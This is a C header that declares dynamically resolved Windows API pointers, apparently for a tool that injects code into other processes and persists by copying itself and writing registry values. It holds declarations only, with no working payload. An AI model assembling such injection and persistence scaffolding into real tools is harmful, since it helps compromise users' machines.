#pragma once
#include <tlhelp32.h> // def struct => LPPROCESSENTRY32


typedef HMODULE(WINAPI *LoadLibraryA_F)(LPCTSTR);





typedef HANDLE(WINAPI *CreateRemoteThread_F)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef HANDLE(WINAPI *OpenProcess_F)(DWORD, BOOL, DWORD);
typedef LPVOID(WINAPI *VirtualAllocEx_F)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL(WINAPI *WriteProcessMemory_F)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
typedef BOOL(WINAPI *CloseHandle_F)(HANDLE);
typedef HANDLE(WINAPI *CreateToolhelp32Snapshot_F)(DWORD, DWORD);
typedef BOOL(WINAPI *Process32First_F)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI *Process32Next_F)(HANDLE, LPPROCESSENTRY32);
typedef DWORD(WINAPI *GetTempPathA_F)(DWORD, LPTSTR);
typedef DWORD(WINAPI *GetModuleFileNameA_F)(HMODULE, LPTSTR, DWORD);
typedef BOOL(WINAPI *CopyFileA_F)(LPCTSTR,LPCTSTR,BOOL);


typedef LSTATUS(WINAPI *RegOpenKeyExA_F)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LSTATUS(WINAPI *RegSetValueExA_F)(HKEY, LPCSTR, DWORD, DWORD, CONST BYTE*, DWORD);
typedef LONG(WINAPI *RegCloseKey_F)(HKEY);


typedef struct {
	CreateRemoteThread_F CreateRemoteThreadF;
	OpenProcess_F OpenProcessF;
	VirtualAllocEx_F VirtualAllocExF;
	WriteProcessMemory_F WriteProcessMemoryF;
	CloseHandle_F CloseHandleF;
	CreateToolhelp32Snapshot_F CreateToolhelp32SnapshotF;
	Process32First_F Process32FirstF;
	Process32Next_F Process32NextF;
	GetTempPathA_F GetTempPathAF;
	GetModuleFileNameA_F GetModuleFileNameAF;
	CopyFileA_F CopyFileAF;
}Kernel32_API;


typedef struct {
	RegOpenKeyExA_F RegOpenKeyExAF;
	RegSetValueExA_F RegSetValueExAF;
	RegCloseKey_F RegCloseKeyF;
}advapi32_API;


typedef struct {
	Kernel32_API Kernel32api;
	advapi32_API advapi32api;
}API_Call;


#ifdef __cplusplus
extern "C" {
#endif
	BOOL loadApi(API_Call *APICall);
#ifdef __cplusplus
}
#endif
